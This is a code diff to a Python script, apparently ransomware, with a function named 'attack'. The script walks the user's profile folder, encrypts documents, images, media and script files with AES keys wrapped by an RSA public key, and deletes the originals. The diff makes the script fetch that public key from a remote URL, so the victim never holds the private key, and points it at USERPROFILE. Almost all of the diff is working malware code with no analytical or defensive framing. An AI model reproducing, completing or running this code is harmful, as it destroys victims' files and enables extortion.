@@ -1,19 +1,19 @@
 import os
+import requests as req
 from time import sleep
 from cryptography.fernet import Fernet as xf
 from Crypto.PublicKey import RSA
 from Crypto.Random import get_random_bytes
 from Crypto.Cipher import AES, PKCS1_OAEP
 
-kpx = RSA.generate(2048)
-skey = get_random_bytes(16)
-pbk = kpx.publickey().exportKey()
-pvk = kpx.exportKey()
-lcx = xf.generate_key().decode()
+
+URL_KEY = "Your URL publicKey"
+pbk = req.get(URL_KEY).text
+lcx = 'license'
 
 def attack(target):
 
-    fl = ".c",".dll",".jpeg",".JPEG",".jpg",".JPG",".png",".PNG",".bmp",".BMP",".doc",".DOC",".docx",".xls",".xlsx",".ppt",".pptx","pdf",".mp4",".mkv",".mpeg",".avi",".ai",".ait",".cdr",".odt",".ods",".odp",".msi",".bat",".vbs",".html",".php",".js",".css"
+    fl = ".c",".dll",".jpeg",".JPEG",".jpg",".JPG",".png",".PNG",".bmp",".BMP",".doc",".DOC",".docx",".xls",".xlsx",".ppt",".pptx",".pdf",".mp4",".mkv",".mpeg",".avi",".ai",".ait",".cdr",".odt",".ods",".odp",".msi",".bat",".vbs",".html",".php",".js",".css"
 
     for p, d, f in os.walk(target):
         for name in f:
@@ -22,22 +22,23 @@ def attack(target):
                     with open(p + name, "rb") as mfile:
                         data = mfile.read()
                         newFile = os.path.join(p, name) +  ".itsec"
+                        print(newFile)
                         file_out = open(newFile, "wb")
 
-                        recipient_key = pbk
+                        recipient_key = RSA.importKey(pbk)
                         session_key = get_random_bytes(16)
 
-                        # Encrypt the session key with the public RSA key
+                        # Mengenkripsi session key with dengan public RSA key
                         cipher_rsa = PKCS1_OAEP.new(recipient_key)
                         enc_session_key = cipher_rsa.encrypt(session_key)
 
-                        # Encrypt the data with the AES session key
+                        # Mengenkripsi data dengan AES session key
                         cipher_aes = AES.new(session_key, AES.MODE_EAX)
                         ciphertext, tag = cipher_aes.encrypt_and_digest(data)
                         [ file_out.write(x) for x in (enc_session_key, cipher_aes.nonce, tag, ciphertext) ]
                         file_out.close()
+                        mfile.close()
                         os.remove(os.path.join(p, name))
-                        #os.rename(os.path.join(p, name), os.path.join(p,newFile))
                 except:
                     continue
 
@@ -59,5 +60,5 @@ def attack(target):
                 problem = "Tidak bisa di isi file"
 
 if __name__ == '__main__':
-    t0 = "H:"
+    t0 = os.environ["USERPROFILE"]
     attack(t0)
